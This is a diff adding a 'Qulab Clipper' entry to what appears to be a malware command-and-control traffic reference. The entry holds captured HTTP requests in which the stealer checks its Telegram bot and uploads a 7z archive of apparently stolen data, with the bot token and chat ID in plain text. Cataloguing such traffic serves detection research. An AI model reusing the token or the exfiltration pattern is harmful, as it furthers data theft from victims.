@@ -1736,6 +1736,53 @@ Flag on "40 00 00 00" pattern, 68 data bytes on first packet
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/quasar.png "Quasar")
 
+#### Qulab Clipper
+~~~
+GET /bot873737212:AAFatKVhb76Tb7yoLv3dCtDO9sgKAsUV_gg/getMe HTTP/1.1
+User-Agent: AutoIt
+Host: api.telegram.org
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Server: nginx/1.16.1
+Date: Fri, 01 Nov 2019 18:11:04 GMT
+Content-Type: application/json
+Content-Length: 124
+Connection: keep-alive
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, OPTIONS
+Access-Control-Expose-Headers: Content-Length,Content-Type,Date,Server,Connection
+
+{"ok":true,"result":{"id":873737212,"is_bot":true,"first_name":"MASADCLIPPERANDSTEALER","username":"aliclipperstealer_bot"}}
+~~~
+~~~
+POST /bot873737212:AAFatKVhb76Tb7yoLv3dCtDO9sgKAsUV_gg/sendDocument HTTP/1.1
+Connection: Keep-Alive
+Content-Type: multipart/form-data; boundary=----WinHttpBoundaryLine_56206.90110
+Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5
+Accept-Charset: utf-8;q=0.7
+User-Agent: Mozilla/5.0 (Windows NT 6.1) WinHttp/1.6.4.0 (WinHTTP/5.1) like Gecko
+Content-Length: 55058
+Host: api.telegram.org
+
+------WinHttpBoundaryLine_56206.90110
+Content-Disposition: form-data; name="chat_id"
+
+880414267
+------WinHttpBoundaryLine_56206.90110
+Content-Disposition: form-data; name="document"; filename="ENU_6887FE9730D2535E9D41.7z"
+Content-Type: application/octet-stream
+
+7z..'...E..P........$.......aO...5...]....C.k".0DL.p1SC	...UM..,.j
+.M.%...}...)..p.d...7.+..w..,..\....w.0z9:6....6...94..._...r..Xu.,........
+.<&:e...S.4.....k._4jn.
+.....)+/q.*?..2 ..j..tj.Y....M.o...$1...H.....r..*%.J.A......Y..2.......0..+.......uz..../O......48.7........&.A...WT{...v.W.\.o.....cax..H.Y...A....<4<.8|........p0E....f..W.X.....Z..	...k5..0 .1t..r.1L.p.Y,.3.....H.f......0.$....JGv...z..L'....'...&<.&m....@rS...r......u...6.#.7z...h.B..._.S.....z..F..q...].V3`w1/...._f(m...$....W<....L&Zv.a......HR.'.r...H'J(.f.......&_?..8.EL...#...j..(....._.\Vw
+....d%{.$MR`e!.]..$
+...-.ct...~Za@YsbNNG...~.R......b..'..oRW3.L..N..&.Q4.
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qulab.png "Qulab")
+
 #### RaaLoader aka Pefsire
 ~~~
 00000000  12 10 00 00 00 00 00 00  00 00 00 00               ........ ....
